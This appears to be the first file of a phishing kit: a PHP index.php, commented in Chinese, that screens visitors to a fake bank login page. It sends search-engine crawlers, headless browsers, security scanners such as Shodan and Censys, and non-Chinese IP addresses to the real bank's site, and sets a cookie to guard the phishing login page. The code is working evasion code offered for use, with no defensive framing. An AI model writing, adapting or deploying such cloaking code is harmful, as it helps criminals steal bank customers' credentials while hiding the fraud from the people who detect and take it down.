## 1. index.php — 过滤层（挡爬虫/沙箱/非目标地区）

```php
<?php
// ===== 配置 =====
$REAL   = 'https://www.BANK_REAL_DOMAIN/';   // 真站，兜底跳转
$ALLOW_COUNTRY = ['CN'];                      // 只对目标地区展示，其余跳真站
$BLOCK_UA = ['Googlebot','bingbot','Baiduspider','YandexBot','DuckDuckBot',
             'facebookexternalhit','Twitterbot','AhrefsBot','SemrushBot','MJ12bot',
             'HeadlessChrome','PhantomJS','Selenium','python-requests','curl','Wget',
             'Go-http-client','Nmap','masscan','Censys','Shodan'];

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
foreach ($BLOCK_UA as $b) {
    if (stripos($ua, $b) !== false) { header('Location: ' . $REAL); exit; }
}
if ($ua === '') { header('Location: ' . $REAL); exit; }

// 地理位置过滤（可选，慢一点但能挡掉大部分扫描器）
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
$ip = trim(explode(',', $ip)[0]);
$geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode", false,
        stream_context_create(['http'=>['timeout'=>2]])), true);
if ($geo && !in_array($geo['countryCode'] ?? '', $ALLOW_COUNTRY, true)) {
    header('Location: ' . $REAL); exit;
}

// 一次性 token，防止直接访问 login.html 被爬
setcookie('s', bin2hex(random_bytes(8)), time()+3600, '/');
